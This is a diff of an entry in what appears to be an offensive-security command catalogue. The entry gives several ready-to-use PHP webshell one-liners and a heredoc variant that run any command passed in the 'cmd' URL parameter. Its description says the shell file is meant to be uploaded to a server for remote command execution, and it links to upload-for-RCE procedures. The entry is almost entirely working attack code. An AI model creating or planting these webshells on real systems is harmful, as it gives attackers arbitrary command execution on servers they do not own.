@@ -1,16 +1,16 @@
 ---
-id: cmd-001
-data: 'echo ''<?php system($_GET["cmd"]); ?>'' > shell.php'
+id: cmd-create-php-shell-001
+data: 'echo ''<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'' > shell.php'
 tags:
+  - shell
   - php
-  - rce
 type: command
 output: null
 executor: bash
 platforms:
   - Linux
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T05:32:13.743Z'
+updated_at: '2025-12-14T17:23:25.053Z'
 verified: false
 validated: true
 submitted: true
@@ -20,40 +20,45 @@ submitted: true
 ## Command
 
 ```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
+echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
 ```
 
 ## Description
 
-This command creates a basic PHP webshell file that allows remote command execution when accessed with a 'cmd' parameter in the URL query string.
+This command creates a local PHP webshell file that can be uploaded to a server for remote command execution.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `echo` | Outputs the PHP code | Yes |
-| `> shell.php` | Redirects output to file | Yes |
+| `echo '...'` | Outputs the PHP code string | Yes |
+| `> shell.php` | Redirects output to file shell.php | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
+echo '<?php system($_GET["cmd"]); ?>' > simple_shell.php
 ```
 
 ### Advanced Usage
 
 ```bash
-cat > shell.php << EOF
-<?php if(isset(\\$_GET['cmd'])) { system(\\$_GET['cmd']); } ?>
+cat > advanced_shell.php << EOF
+<?php
+if(isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
 EOF
 ```
 
 ## Expected Output
 
-No direct output; the file shell.php is created with the PHP code. Verify with `cat shell.php` to see the contents.
+No direct output; creates the file shell.php with the PHP code. Verify with `cat shell.php`.
 
 ## Related
 
-- [[Related Procedure]]
+- [[commands/curl-php-upload]]
+- [[procedures/Upload-Malicious-PHP-File-for-RCE]]
